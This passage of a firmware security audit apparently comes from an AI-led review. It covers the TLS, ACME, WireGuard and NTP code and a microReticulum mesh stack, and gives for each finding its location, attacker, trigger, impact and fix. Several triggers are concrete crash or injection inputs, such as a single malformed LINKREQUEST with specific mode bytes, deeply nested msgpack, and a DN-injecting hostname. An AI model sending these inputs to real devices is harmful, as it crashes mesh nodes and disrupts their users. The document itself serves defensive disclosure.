**Issue:** Cryptographically this is sound: TLS 1.2 minimum (IDF 5.x mbedTLS 3 has no 1.0/1.1), forward-secret ECDHE with P-256, AEAD only, SHA-256 signatures, `VERIFY_NONE` is correct for a server without client certs. Observations: no TLS 1.3 (fine, but note the ciphersuite pin would not cover 1.3 suites if it is ever enabled — 1.3 uses `mbedtls_ssl_conf_tls13_*`); session tickets are enabled in Kconfig and the ticket key lives in RAM (`MBEDTLS_SSL_TICKET_C` rotates it), acceptable; no ALPN is configured, so a browser cannot negotiate h2 and WebRTC/DTLS shares the same cert via `tlsGetCert/Key` — fine. The self-signed cert has a fixed serial `0x01` and a fixed validity window 2025-01-01…2035-12-31, so a regenerated cert (hostname change) has the same serial as the old one for the same CN, which some browsers cache as "same cert, different key" (SEC_ERROR_REUSED_ISSUER_AND_SERIAL) — a usability, not security, issue. The CTR_DRBG personalisation is the hostname (public), fine; the entropy source is IDF's `esp_fill_random`.
**Trigger:** n/a.
**Impact:** None exploitable found.
**Fix:** Randomise the self-signed serial; when enabling TLS 1.3 later, also pin the 1.3 suite list; consider `mbedtls_ssl_conf_min_tls_version` explicitly so a future Kconfig change cannot lower it.

### [Low] ACME: hand-rolled DNS response parser has an out-of-bounds stack read; TXT verification is spoofable

**Where:** `acme.cpp:289-296` (`rpos += 1 + resp[rpos]` may exceed `n`, then `resp[rpos]` is read at up to `n+255` ≥ 512 bytes into a 512-byte stack buffer), `acme.cpp:244-246` (fixed DNS ID `0x1234`).
**Attacker:** (2) On-path / anyone who can spoof a UDP reply to the device's ephemeral port during the ≤120 s poll.
**Issue:** A crafted TXT reply with a label length pointing past the packet makes the parser read one byte past the buffer (read only, no write; the value only feeds a `== 0` test), so it is not memory-corrupting. A spoofed "TXT present" reply only makes `waitForTxtRecord()` return early — the CA performs its own validation, so no certificate mis-issuance follows; a spoofed "absent" reply just fails the run. All other ACME traffic is over verified HTTPS to a hard-coded Let's Encrypt URL, JWS-signed, with the `Location`/`Replay-Nonce` taken from verified responses, so the MITM surface is small.
**Trigger:** Spoof a UDP/53 reply from 8.8.8.8 with a malformed name.
**Impact:** Negligible (1-byte OOB read; early/late challenge response).
**Fix:** Bound every `rpos` advance by `n`; randomise the transaction ID; or resolve with `getaddrinfo`/lwIP `dns_gethostbyname` instead of a private client.

### [Low] `s.net.hostname` from the browser is unvalidated and is spliced into an X.509 DN, SOAP XML, the AP SSID and mDNS

**Where:** `net.cpp:2985-2999` / `hostnameCliCmd` (only the CLI path validates `[A-Za-z0-9_]`), `tls.cpp:112-118` (`"CN=" + hostname + ".local"` parsed as a DN string), `upnp.cpp:604-640` (hostname in `<NewPortMappingDescription>` without XML escaping).
**Attacker:** (3) Authenticated user (writes the `s.*` key directly through the settings text row).
**Issue:** A hostname containing `,` / `=` injects extra DN attributes into the self-signed cert; `<`/`&` produce malformed SOAP; a 31-byte hostname plus `_xxxx` makes the AP SSID exceed 32 bytes (`strncpy` into `ssid[32]` without terminator — `ssid_len` is set from `strlen(ssid)` where `ssid` is the truncated 33-byte buffer, so no overflow, just a mangled SSID).
**Trigger:** Set hostname `x,O=Evil` from the settings pane.
**Impact:** Cosmetic / self-inflicted; no privilege gained.
**Fix:** Apply the CLI's character rule in one place (a `net.hostname.set` command key or a storage validator) and reject bad values from every surface.

### [Low] Handshake timestamp and endpoint parsing in the WireGuard wrapper

**Where:** `wg/esp-idf/src/esp_wireguard/wireguard-platform.c:580-592` (`wireguard_tai64n_now` from `gettimeofday`), `wg.cpp:253-257` (`strrchr(':')` endpoint split), `esp_wireguard.c:700-706` (peer allowed-IPs forced to `0.0.0.0/0`).
**Attacker:** (2) MITM / (3) config writer.
**Issue:** (a) The tunnel starts on `NET_EV_UPSTREAM_UP`, typically before NTP has set the clock; the first handshake carries a 1970 TAI64N which a server that has already seen a later timestamp from this key rejects as replay, and after NTP jumps the clock the next handshake works — a reliability nuisance, but if the clock ever runs *ahead* (bad NTP, `date` CLI) and is later corrected, the device is locked out until the wall clock passes the old value. Not a confidentiality issue. (b) An IPv6 literal endpoint (`[2001:db8::1]:51820`) is mis-split; a hostname with no port is fine. (c) Allowed-IPs for the single peer are `0.0.0.0/0`, so any source address decrypted from the peer is accepted — normal for a client with one peer, but note that the wg netif is never made the default route (`esp_wireguard_set_default` is unused), so only the tunnel subnet is routed through it and everything else keeps going out over WiFi in the clear; when the tunnel is down the netif is removed and packets addressed to the tunnel subnet go to the WiFi default route (private-address leak to the LAN/upstream, dropped there). Key generation uses `esp_fill_random` (hardware TRNG, RF on at that point) with correct clamping; the private key is in `secrets.wg.key`, filtered from browser sync (verified) but readable with `show secrets.wg.key` on any authenticated CLI (including the unauthenticated TCP CLI above).
**Trigger:** n/a.
**Impact:** Availability only; no key exposure beyond the CLI.
**Fix:** Delay `wgStart` until `sys.time.valid` (or refresh the handshake after the first NTP sync); parse bracketed IPv6 endpoints; document that the tunnel is split-tunnel by design and that traffic to the tunnel subnet is not blocked while the tunnel is down.

### [Info] mDNS advertises hostname + `_http`, `_https`, `_ssh` (and any `s.net.mdns.*` entry) on every link, including the AP

**Where:** `spangap_mdns.cpp:24-37, 40-47`.
**Attacker:** (1) LAN.
**Issue:** Expected behaviour; `s.net.mdns_enable` defaults on. Only the hostname and ports are disclosed; no TXT records with version/serial. Any `s.net.mdns.<name>` written by an authenticated user becomes an advertised service, harmless.
**Fix:** None needed; consider defaulting mDNS off while on the fallback AP.

### [Info] NTP is unauthenticated, server name is operator-settable, browser may set the clock once

**Where:** `ntp.cpp:78-96`, `ntp.cpp:233-244` (`sys.time.set` accepted only while the clock is invalid).
**Attacker:** (2) MITM.
**Issue:** Standard SNTP; a MITM can set any time, which affects ACME's expiry math (`acmeCheck` bails before 2025 but otherwise trusts the clock), cert validity checks by clients, and the WireGuard timestamp above. No NTS, no sanity bound on the step size. The `sys.time.set` browser push is correctly ignored once time is valid.
**Fix:** Optional: refuse steps that move the clock backwards more than a threshold once `sys.time.valid`, or bound the first sync with the RTC chip when present (`spangap-rtc` already adopts a post-2025 RTC time before NTP).

### [Info] spangap-rtc

**Where:** `rtc_service.cpp`, `rtc.cpp`.
**Issue:** Pure I2C driver plus policy; the only external inputs are the `sys.time.disciplined` counter (any storage writer can fake "authority live", which only stops the keeper from stepping the clock from the chip — the same writer could just set the clock) and the `rtc sync` CLI. No network surface, no findings.

## Positive notes

- Every outbound HTTPS client (acme, duckdns, wget) attaches the IDF certificate bundle and leaves hostname verification on; acme disables auto-redirect for directory/JWS requests and pins the production Let's Encrypt URL; JWS nonces and `Location` come only from verified responses.
- The TLS server configuration is modern and minimal: TLS 1.2+, ECDHE-ECDSA-CHACHA20-POLY1305 only, P-256, SHA-256, AEAD only, forward secrecy, no client-cert path, no renegotiation, and the ESP32-S3 hardware-GCM bug is explicitly avoided.
- Secrets are handled thoughtfully at the storage layer: `secrets.*` is filtered from every browser sync and from `dump`, browser writes to it are ignored, and the WireGuard private key and auth hashes live there; the WireGuard UI only ever sees "generated / not set" plus the public key.
- Listen ports cannot be registered from the network: `NET_PORT_REG_PORT` is an ITS aux message from in-firmware tasks only, `netEps` is keyed by `nvsKey`, and `cli`/`log` are registered with `publicFacing=false`, so upnp can never forward the CLI/log/ssh ports; only listeners whose owners opted in (`iface-tcp` incoming ports, the RNode TCP door) plus HTTPS/WebRTC/optional HTTP are mapped, and upnp withdraws mappings it no longer wants and on link-down.
- upnp, acme and duckdns are all off / unconfigured by default; the HTTP-01 handler strict-compares one in-flight token in RAM and never touches flash.
- WiFi passphrases are never logged (only their length); `net list` shows only open/closed; the log/CLI TCP ports default to closed.
- The WireGuard wrapper binds an ephemeral local port (`listen_port = 0`) so the device is not a WireGuard responder on the LAN; key generation uses the hardware TRNG with proper Curve25519 clamping and the DRBG-not-seeded panic was fixed by going direct.
- The relay's backpressure design (socket left unread while the ITS stream is full, parked send remainder) prevents the classic "drop bytes mid-stream" corruption, and `wget`'s worker/semaphore lifecycle is UAF-safe.

---

# rns (packet/transport plane)

Scope: the device Reticulum stack in `/home/spangap/reticulous/rns` — the
modified microReticulum fork under `esp-idf/components/microreticulum/` plus the
rnsd service under `esp-idf/src/`. Attacker model: anyone able to put bytes on an
interface (LoRa air, TCP peer, ESP-NOW, BLE, AutoInterface LAN), authenticated at
that layer only by IFAC when configured; plus untrusted content on the SD/state
partition. Every finding below was traced through the actual code path; paths I
could not fully close are called out under Coverage.

## Coverage

Read in full: `Packet.cpp` (unpack/pack, receipt/proof validation),
`Transport.cpp` (`inbound`, `outbound`, `jobs`, IFAC derive/mask/verify, the
announce ring + all cull/evict paths, `path_request*`, tunnels, packet cache,
`start`), `Interface.cpp`/`Interface.h`, `Directory.{h,cpp}` (record pool, guard
ring, eviction, image load/snapshot), `MsgPack.h` (Unpacker + ArrayReader +
skip/unpack primitives), `Identity.cpp` announce slicing/`validate_announce`,
`Bytes.{h,cpp}` slicing, `Destination.cpp` announce construction + request-handler
registration, `Link.cpp` `handle_request`/REQUEST-RESPONSE decode/`*_from_lr/lp`
parsers, `Resource.cpp` bz2 wrappers, and in `rnsd.cpp`: interface registration
(`onTransportConnect`/`onTransportRecv`/`onIfaceAux`), the remote-management
handlers, all CLI verbs, directory image load/persist + storage provider, announce
fan-out, app_data formatters, ratchet persistence, the local ITS byte-array API
frame parsers, and `rnsd_peers.cpp`. Cross-checked interface-straddle registration
values (bitrate/mode/radius/ifac) and the bzip2 CVE-2019-12900 fix.

The three sub-reviewers I dispatched were all killed by the session rate limit
before producing output, so this is a single-pass solo review. What that means for
depth: I did **not** fully audit `Link.cpp` establishment/key-derivation/Resource
reassembly (colleague's crypto/Link half, but the REQUEST-decode entry point is in
my finding H1), `Channel.cpp`, `Resource.cpp` part re-request/window accounting, or
the `tlsf.c` allocator. `read_path_table`/`write_path_table`/tunnel table are dead
(`#if defined(RNS_USE_FS)…` never defined) so unreviewed beyond confirming they are
inert. I did not exercise the browser TS.

## Findings

### [High] Unbounded msgpack recursion in link REQUEST decode → rnsd stack overflow / reboot
**Where:** `esp-idf/components/microreticulum/src/MsgPack.h` `detail::skip_value`
(~L274-306, self-recursion at L293-303) and `unpack_blob_or_object` (~L420-450, the
`skip_value(p,n)` at ~L437); reached from `esp-idf/components/microreticulum/src/Link.cpp`
`Link::receive` REQUEST case L1426-1444 (`from_request` → `consume_payload` /
`skip_rest`).
**Attacker:** anyone who can complete an *anonymous* Link handshake to a hosted
link-accepting destination (e.g. `lxmf.delivery`, a nomad node). Link
establishment requires no identity; IDENTIFY/allow-list checks happen only later in
`handle_request`, after this decode.
**Issue:** `skip_value` and `unpack_blob_or_object` recurse once per level of msgpack
array/map nesting with no depth cap. `Link::receive` decrypts a REQUEST packet and
calls `MsgPack::Unpacker::from_request`, whose `consume_payload` (via
`unpack_blob_or_object`) and `skip_rest` walk attacker-controlled bytes. The
node-local log pretty-printer `mpDecode` (rnsd.cpp) *does* cap depth at 8, but this
µR path does not.
**Trigger:** open a link to a hosted destination, send an encrypted REQUEST whose
payload (or an extra array element) is deeply nested fixarrays — e.g. a few hundred
`0x91` bytes in a single ~440 B link packet, or arbitrarily deep in a
Resource-carried request (bounded only by `s.lxmf.max_resource_size`, default
256 KB). Each level adds a stack frame; the rnsd task stack is 12 KB
(`spawnTask(rnsdTaskMain, …, 12288, …)`, rnsd.cpp L8510).
**Impact:** rnsd task stack overflow → crash/reboot, repeatable → sustained
node-level DoS. Unauthenticated (link handshake is anonymous). No RCE traced.
**Fix:** add a recursion-depth limit to `detail::skip_value` (and the structured
branch of `unpack_blob_or_object`), throwing past e.g. 16 levels, mirroring
`mpDecode`'s depth-8 guard. Consider also a total-elements bound.

### [Medium] Directory image: blob length field not revalidated on load → OOB heap read into a transmitted path-response
**Where:** `esp-idf/components/microreticulum/src/Directory.cpp` `imageLoad`
(loads blob slots via `memmove` with no per-slot length check) and `rdirCopyBlob`
(`uint16_t len = blobLen(slot); if (len == 0 || len > cap) return 0; memcpy(buf,
slot + RDIR_BLOB_OFF_RAW, len);`).
**Attacker:** anyone who can write `<state>/rnsd/dir.img` (the SD/state partition —
explicitly in scope as untrusted persisted content).
**Issue:** `rdirIngest` guarantees a stored blob's inline `len` is
`≤ s_blob_slot_sz - 20`, but the image loader trusts the file's `len` field and
never re-checks it, and `rdirCopyBlob` bounds `len` only against the caller's `cap`
(MTU=500 in `path_request`), not against the slot size (default 320). A crafted
image whose blob `len` field is set to e.g. 480 makes `memcpy` read
`20 + 480 = 500` bytes from a 320-byte slot, reading ~180 bytes past the slot into
the adjacent blob slot — and for the final slot, past the end of the gp_alloc'd
arena.
**Trigger:** craft dir.img with a valid header (`dir_count`/`blob_count` within
pool bounds so the existing header checks pass) and a blob record with an oversized
`len`; reboot; the record is served on the next `/path`-answered path request.
**Impact:** heap over-read of up to ~180 bytes copied into an announce that is then
transmitted → information disclosure of adjacent heap/arena bytes to the network;
possible fault if the read crosses an unmapped boundary. Requires local flash/SD
write; no network-only path.
**Fix:** in `imageLoad`, after loading each blob slot, validate
`blobLen(slot) ≤ s_blob_slot_sz - RDIR_BLOB_PREFIX` (free the slot / clear used bit
otherwise); and/or clamp in `rdirCopyBlob` to `s_blob_slot_sz - RDIR_BLOB_PREFIX`.

### [Medium] Half-open link flood and transit-table growth are time-bounded, not count-bounded → memory-exhaustion DoS on a low-RAM device
**Where:** `esp-idf/components/microreticulum/src/Transport.cpp` — inbound
LINKREQUEST to a local destination → `Destination::receive` → link registered into
`_active_links`/`_pending_links` (reaped only by establishment timeout in `jobs()`
L438-470); transit LINKREQUEST inserts `_link_table` (L2088) reaped by
`LINK_TIMEOUT`/`_proof_timeout`; transit proofs insert `_reverse_table` (L2098)
reaped after `REVERSE_TIMEOUT` = 8 minutes. All culls run on the
`_tables_cull_interval` = 60 s sweep (link/reverse) or per-links-check (1 s).
**Attacker:** any peer that can reach a hosted link-accepting destination (for the
half-open flood — no auth, no transport mode needed); for `_link_table`/
`_reverse_table` growth, an attacker on a node with `s.rnsd.transport_enabled=1`
(default 0) that addresses transit packets at us.
**Issue:** none of these tables has a hard entry cap; they are bounded only by
`entry_rate × retention`. On a fast medium (TCP) an attacker can create entries far
faster than the 60 s cull sweep frees them. Each half-open `Link` carries ephemeral
keys + `LinkData`; `_reverse_table` entries persist 8 minutes.
**Trigger:** flood anonymous LINKREQUESTs to `lxmf.delivery` (half-open links), or,
on a transport node, flood transit packets with distinct hashes.
**Impact:** heap/PSRAM exhaustion → allocation failures (which in
`Interface::send_outgoing`/`handle_incoming` deliberately `ESP.restart()` on
`bad_alloc`) → reboot loop. Bounded by retention, self-heals when the flood stops.
**Fix:** cap `_active_links`/`_pending_links`/`_link_table`/`_reverse_table` entry
counts (drop-oldest or refuse-new when full), as the announce ring, hashlist and
pr-tags already are; and/or cull on insert when over a bound rather than only on the
60 s sweep.

### [Low] `rnpath -d <dest>` hex-decodes without a length check → out-of-bounds read
**Where:** `esp-idf/src/rnsd.cpp` `cliRnpath` drop branch: `h.assignHex(...
filter_dest ...); RNS::Transport::expire_path(h);` → `remove_path` →
`rdirClearRoute(h.data())`, which `memcmp(r->dest, dest, RDIR_DEST_LEN=16)`.
**Attacker:** a local CLI user (via `spangap cli "rnpath -d <short>"`) — low trust
level, but crashes matter on-device.
**Issue:** unlike `onCmdDropPath`/`onCmdRequestPath` (which guard `strlen==32`
before decoding) and `clink`/`creq`/`rnprobe` (which check
`size()==DEST_HASH_LEN*2`), the `rnpath -d` path passes an arbitrary-length decoded
hash straight to the 16-byte directory API. A short hash makes `dirFind`/
`rdirClearRoute` `memcmp` read up to ~12 bytes past the caller's `Bytes` buffer.
**Trigger:** `rnpath -d abcd`.
**Impact:** OOB heap read of a few bytes; benign match/mismatch or a fault on an
unlucky boundary. Local only.
**Fix:** require `filter_dest.size() == RDIR_DEST_LEN*2` (and `h.size()==16`) before
`expire_path`.

### [Low] Remote-management handlers deref `value_ptr()[0]` on a possibly-empty array slot → 1-byte over-read
**Where:** `esp-idf/src/rnsd.cpp` `rmPathHandler` (`if (a.value_ptr()[0] == 0xc0)`
at ~L2620 and ~L2627) and `rmStatusHandler` (`a.value_ptr()[0] == 0xc3` ~L2707).
**Attacker:** an identity on the remote-management allow list (so gated — an
unidentified/unlisted link is refused before reaching the handler).
**Issue:** after `ArrayReader::next()` (which only checks the declared element
count, not remaining buffer), the handler dereferences the first value byte before
the length-checked `unpack_*`. A request whose array header claims more elements
than the buffer holds makes `value_ptr()` point at `_p + _n`, so `[0]` reads one
byte past the buffer.
**Trigger:** an allow-listed peer sends `/path` or `/status` with a truncated
argument array.
**Impact:** 1-byte over-read; effectively benign, allow-list gated. No amplification.
**Fix:** check `a.value_len() > 0` before dereferencing `value_ptr()[0]`.

### [Low] `extra_link_proof_timeout` divides by interface bitrate without a zero guard
**Where:** `esp-idf/components/microreticulum/src/Transport.cpp`
`extra_link_proof_timeout` (~L3454): `((1.0/(double)interface.bitrate())*8.0)*MTU`.
**Attacker:** indirect — depends on an interface registering `bitrate == 0`
(misconfiguration; all shipped straddles set a nonzero bitrate, but the field is
attacker-adjacent only via config).
**Issue:** unlike `next_hop_per_bit_latency`/`first_hop_timeout` which guard
`bitrate > 0`, this one does not. `1.0/0.0` → `+inf`, so a transit LINKREQUEST
arriving on a bitrate-0 interface gets `_proof_timeout = inf` and its `_link_table`
entry is never culled (`OS::time() > _proof_timeout` never true) → a permanent
per-packet leak.
**Trigger:** an interface registered with bitrate 0 on a transport node, then transit
link requests.
**Impact:** slow unbounded `_link_table` growth; config-dependent.
**Fix:** guard `bitrate > 0` (return `0.0` otherwise), matching the sibling helpers.

### [Info] Signed-announce storm within an interface's community radius churns the directory
**Where:** `Transport::inbound` retain policy (Transport.cpp ~L2360-2420) +
`Directory.cpp` eviction categories.
**Attacker:** anyone in radio range of a `community_radius > 0` interface (LoRa/BLE/
ESP-NOW/LAN default radius 3) who spends airtime generating fresh signed identities.
**Issue:** an announce validated and arriving at `hops ≤ radius` is retained with
`RDIR_CLAIM_ANSWER_FOR` (custody), which ranks it `RDIR_CAT_PERSIST` — the top tier,
alongside genuine community members. A sustained stream of fresh fake identities can
evict genuine members (oldest-`last_heard`/`claim_touch` first within the tier).
**Impact:** directory churn / eviction of real community records; bounded by pool
size, self-heals, and each fake costs the attacker a signature + airtime. This is
inherent to an open radius-based mesh (anyone in range *is* the community) rather
than a code defect. Radius-0 uplinks (TCP default) are immune — beyond-radius
announces are guard-tracked but never retained. Noted so it is a conscious accepted
risk; consider a per-interface newly-seen-destination rate cap if it bites.

## Positive notes

- **IFAC is enforced before any parsing and matches the Python reference.**
  `Transport::inbound` (L1706-1765) verifies/de-masks *before* `Packet::unpack`:
  an IFAC-required interface drops packets without the flag and packets whose
  recomputed Ed25519 signature (deterministic — the pitfall is documented) does not
  match; an open interface drops any packet carrying the IFAC flag. `derive_ifac`
  HKDF/key/salt derivation and the mask sizing match upstream; `ifac_size` clamped
  1–64. Mask indexing stays within bounds on both directions.
- **Announce signature is verified before any table insert.** All retain/`rdirIngest`
  /handler-dispatch logic in `inbound` is inside `Identity::validate_announce(packet)`
  (L2199), and `validate_announce` (Identity.cpp L304-347) checks the signature and
  reconstructs+compares the destination hash before returning true; ratcheted
  announces too short to hold their ratchet are rejected. A public-key mismatch on a
  known destination is rejected as a possible path-modification attempt.
- **Packet unpack length handling is safe.** `Packet::unpack` (Packet.cpp L392-430)
  enforces `HEADER_MINSIZE`(19)/`HEADER_MAXSIZE`(35) before slicing; `_data.assign`
  offsets never underflow. `Bytes::mid/left/right` (Bytes.{h,cpp}) all clamp length
  and return `NONE`/truncated rather than reading OOB; `operator[]` throws rather
  than reading OOB.
- **Link LR/LP parsers are size-gated:** `mtu_from_lr/lp_packet`,
  `mode_from_lr/lp_packet`, `link_id_from_lr_packet`, `validate_request` all check
  `packet.data().size()` against the exact expected lengths before indexing.
- **bzip2 decompression is bounded and the CVE-2019-12900 fix is present.**
  `Resource.cpp` `bz2_stream_decompress` validates the `BZh[1-9]` header, uses the
  fork's `BZ2_bzDecompressInitBounded(small=1, cap)` so table sizing follows the
  *output bound* not the peer's block-size digit (defusing the 2.25 MB
  decompression-bomb), refuses over-bound input as `BZ_DATA_ERROR`, and
  `rnsdBz2Decompress` double-checks `decoded.size() > max_out`. `decompress.c` L312
  has `if (nSelectors > BZ_MAX_SELECTORS)`.
- **Remote management enforces the allow list exactly as upstream.** `rmRegisterHandlers`
  registers `/path` and `/status` with `ALLOW_LIST`; `Link::handle_request`
  (Link.cpp L1054-1064) requires a non-empty `__remote_identity` present in the
  handler's `_allowed_list` — an unidentified link and an unlisted identity are both
  refused, and an empty list refuses everyone. Both handlers also early-return on
  `!remote`.
- **Announce/app_data parsers on the untrusted path are bounded:** `rnsdAnnounceName`/
  `utf8Ok` (rnsd_peers.cpp) bounds every index against `n`, validates UTF-8 and
  clamps to the output buffer; `mpDecode` (rnsd.cpp) caps depth at 8 and output at
  800 B with `needN` guards on every read; the announce fan-out frame caps app_data
  at 1024 (drops larger) into a matching fixed buffer.
- **Directory image header validation is sound:** magic + `format_ver` +
  slot-size checks, `dir_count`/`blob_count` bounded against pool slot counts, `len`
  checked ≥ header and ≥ expected, `tail = s_alloc_bytes - expect` cannot underflow,
  and dir-record seq counters are cleared of the odd (in-flight) bit on load so a
  reader cannot spin. (The one gap is the per-blob `len` field — finding M above.)
- **The dedup/retransmit/discovery tables that *are* count-bounded evict correctly:**
  `_packet_hashlist` and `_discovery_pr_tags` evict oldest-first via their FIFO order
  lists (not std::set content order — the comment explains why), the announce ring is
  a fixed allocation that evicts the oldest slot when full, and the path-escalation
  table is a fixed 16 slots that fails open. The RAII `JobsLockGuard` in `inbound`
  releases `_jobs_locked` on every early return.

## What I did not get to
- Full audit of `Link.cpp` establishment/key-derivation and `Resource.cpp` part
  reassembly/window accounting (colleague's Link/Resource half; only the REQUEST
  decode entry point (H1) is covered here).
- `Channel.cpp` sequencing/dedup memory bounds.
- `tlsf.c` allocator behaviour under fragmentation.
- Dynamic confirmation of the H1 stack-overflow threshold (static reasoning from the
  12 KB stack + uncapped recursion; not run on hardware, per read-only rules).

---

# rns (identity/crypto/link/resource plane)

All paths below are under `/home/spangap/reticulous/` unless absolute. `µR` = `rns/esp-idf/components/microreticulum/src`. Reference behaviour cited is Python Reticulum 0.9.x (`RNS/Link.py`, `RNS/Identity.py`, `RNS/Resource.py`, `RNS/Channel.py`, `RNS/Cryptography/Token.py`).

## Coverage

Read in full: `µR/Cryptography/*` (Random.h, Hashes.cpp, HKDF.cpp, HMAC.h, PKCS7.h, AES.h, Token.cpp, Fernet.cpp, Ed25519.h, X25519.h; CBC.cpp/CBC.h are dead upstream scaffolding not in the build), `µR/Identity.cpp` + `Identity.h`, `µR/Link.cpp` (all 2430 lines), `µR/Channel.cpp`, `µR/Resource.cpp` (all 1337 lines, including the bz2 wrapper and `ResourceAdvertisement::unpack`), `µR/Bytes.cpp` (comparison semantics), `µR/donna/ed25519.c` `ed25519_sign_open`, `µR/donna/x25519.c` tail (low-order handling), `µR/Destination.cpp` receive / link-request / ratchet / request-handler paths, `µR/Type.h` constants, `µR/Log.h`.
Read in part: `rns/esp-idf/src/rnsd.cpp` (identity load/persist at 364-410, ratchet persistence 1671-1760, trace toggle 8227, service bring-up 8385-8462), `µR/MsgPack.h` (bounds checks of `unpack_uint/str/bin/array/map` only), `spangap-core/esp-idf/src/storage.cpp` (`isSecret` gates, `cmdShow`, browser mirror), `spangap-core/esp-idf/src/cli.cpp` (`cliTcpConnect`), `spangap-net/esp-idf/src/net.cpp` (WiFi start timing, TCP CLI endpoint), `spangap-core/esp-idf/src/mem_new.cpp`, ESP-IDF v5.5.4 at `/opt/esp/idf` (`bootloader_utility.c`, `esp_random.h`).

Not covered (out of time or out of scope): `Packet.cpp` (pack/unpack bounds, packet-hash dedupe), `Transport.cpp` beyond grep, `Directory.cpp`, the rest of `MsgPack.h` (the transport reviewer reported the recursion), the vendored bzip2 patch `BZ2_bzDecompressInitBounded` itself, ed25519-donna / x25519 field arithmetic, rnsd's remote-management (`-R`) allow-list plumbing at rnsd.cpp ~2760-2840, rnsd's `rnsdDecryptSelf` out-of-band decrypt entry, the browser side, and any consumer (lxmf/nomad) of Channel/Resource payloads. No dynamic testing was done; every finding below was traced statically.

Already reported by the transport-plane reviewer and deliberately not repeated here: `MsgPack.h` `skip_value`/`unpack_blob_or_object` recursion; half-open-link and transit-table growth being time-bounded only; Directory image blob length.

## Findings

### [Critical] LINKREQUEST with an unknown link-mode byte throws an exception *pointer* and reboots the node
**Status: fixed 2026-09-10.** `validate_request` rejects any mode outside `ENABLED_MODES` before `handshake()`; every `throw new` in the fork now throws by value; rnsd's `onTransportRecv` wraps `handle_incoming` in `catch (const std::exception&)` plus `catch (...)`.
**Where:** `µR/Link.cpp:315` (`Link::handshake`: `else throw new std::invalid_argument(...)`), reached from `Link::validate_request` at `µR/Link.cpp:249-261`, whose handler at `:272` is `catch (const std::exception& e)`. Same pattern at `µR/Cryptography/Token.h:43`, `Token.cpp:105`, `Token.cpp:161`, `µR/Link.cpp:2218` (those four are not reachable from the wire).
**Attacker:** anyone who can put a packet on any interface (LoRa, TCP, ESP-NOW, BLE, LAN) and knows one of our announced destination hashes (they are broadcast in every announce).
**Issue:** `mode_from_lr_packet` (`:175-181`) takes bits 7..5 of payload byte 64 as the link mode with no validation and `validate_request` stores it (`:249`) and calls `handshake()` (`:261`). Only modes 0 and 1 are handled; modes 2..7 hit `throw new std::invalid_argument`, i.e. a thrown `std::invalid_argument*`. The `catch (const std::exception&)` in `validate_request` does not match a pointer type, nor does anything above it (`Destination::incoming_link_request` catches `std::bad_alloc`/`std::exception`, `Transport::inbound` has no `catch(...)`, rnsd's task loop catches only `std::exception`), so the exception is unhandled and `std::terminate()` aborts the firmware. The Python reference raises a `TypeError` in `handshake()` which `validate_request`'s `except Exception` swallows; the port's `throw new` defeats the equivalent handler.
**Trigger:** one LINKREQUEST packet (header flags with packet type LINKREQUEST, destination = any of our SINGLE destination hashes) whose payload is 67 bytes: any 64 bytes of "public keys" followed by 3 signalling bytes whose first byte has bits 7..5 = 2..7, e.g. `0x40 0x01 0xF4`. No key, no path, no prior state needed. Repeatable every reboot.
**Impact:** remote, unauthenticated, single-packet crash/reboot loop of every rns node from any interface, including over the air.
**Fix:** in `Link::handshake` throw by value (`throw std::invalid_argument(...)`); additionally reject the request up front in `validate_request` when `mode_from_lr_packet(packet)` is not in `Link::ENABLED_MODES` (this also stops the AES-128 request from getting as far as `prove()` before being dropped). Fix the other four `throw new` sites the same way; a `catch (...)` at the top of `Transport::inbound` would be a belt-and-braces guard for the whole packet path.

### [High] Identity and link keys may be generated from an ESP32-S3 RNG with no entropy source enabled
**Status: fixed 2026-09-10.** New spangap-core primitive `randomBytes()` / `randomU32()` (include/random.h, src/random.cpp, docs/random.md): a CTR-DRBG seeded as the first act of `spangapInit()` inside a `bootloader_random_enable()` window, before any ADC or radio driver runs. The fork's `Random.h`, `Ed25519.h`, `X25519.h` and donna's `ed25519_randombytes_unsafe` draw from it; so do sshd's host and user seeds, ephemeral X25519 keys, KEXINIT cookies, padding, the mlkem `randombytes` hook and the mbedTLS ECP wrapper, and spangap-core's password salts and session tokens. The `Random.h` comment is corrected.
**Where:** `µR/Cryptography/Random.h:28` (`esp_fill_random`), `µR/Cryptography/Ed25519.h:69` and `X25519.h:73` (key generation straight from `esp_fill_random`), `rns/esp-idf/src/rnsd.cpp:8034` (`loadOrCreateIdentity()` runs inside `RnsdService::onInit`, i.e. during boot-time `init_order()`), `spangap-net/esp-idf/src/net.cpp:751,1836,1881,2042,2063` (`esp_wifi_start` happens later, from net's state machine), `spangap-net/esp-idf/src/net.cpp:125` (`s.net.wifi.enable=0` is a supported radio-off mode). ESP-IDF v5.5.4 `components/bootloader_support/src/bootloader_utility.c:792` calls `bootloader_random_disable()` before jumping to the app; `components/esp_hw_support/include/esp_random.h:20` states "If Wi-Fi or Bluetooth are enabled, this function returns true random numbers. In other situations ... pseudo-random" unless `bootloader_random_enable()` has been called. Nothing in the workspace calls `bootloader_random_enable` (grep over `spangap-core`, `spangap`, `rns`).
**Attacker:** passive; anyone who can later guess or reproduce the RNG state.
**Issue:** The comment in `Random.h:5-8` asserts that the entropy source is "true on all spangap boots before any RNS code runs", but the code says otherwise: the long-term identity (X25519 + Ed25519 seeds) is generated on first boot in `onInit`, before net's task has started the WiFi driver; and on a node configured radio-off (`s.net.wifi.enable=0`, no BT) the RF entropy source is never enabled for the life of the device, so every Link ephemeral X25519 key (`Link.cpp:61,80-81`), every Token IV (`Token.cpp:84`), every ratchet (`Identity.h:153`) and every resource random hash comes from the un-entropied RNG.
**Trigger:** first boot of a fresh device (identity), or any boot with WiFi disabled (all session keys).
**Impact:** predictable or low-entropy long-term identity keys and/or session keys; on the S3 without an entropy source the RNG output is derived from RC oscillator jitter and is not cryptographically secure per the vendor's own documentation. Concrete exploitability depends on how reproducible the S3's un-entropied RNG output is across boots, which was not measured here.
**Fix:** seed a DRBG once at boot from a proper source and draw all RNS randomness from it: call `bootloader_random_enable()` before generating the identity and seeding an `mbedtls_ctr_drbg` (then `bootloader_random_disable()` before WiFi/ADC use), or defer `loadOrCreateIdentity()` until net reports the RF driver started, and in radio-off configurations keep `bootloader_random_enable()` on. At minimum, route `RNS::Cryptography::random`/`randomnum` and the two key constructors through the seeded CTR-DRBG rather than raw `esp_fill_random`, and remove the incorrect comment.

### [High] The identity private key and all ratchet private keys are printable with `show secrets…` on every CLI transport; the raw TCP CLI has no login
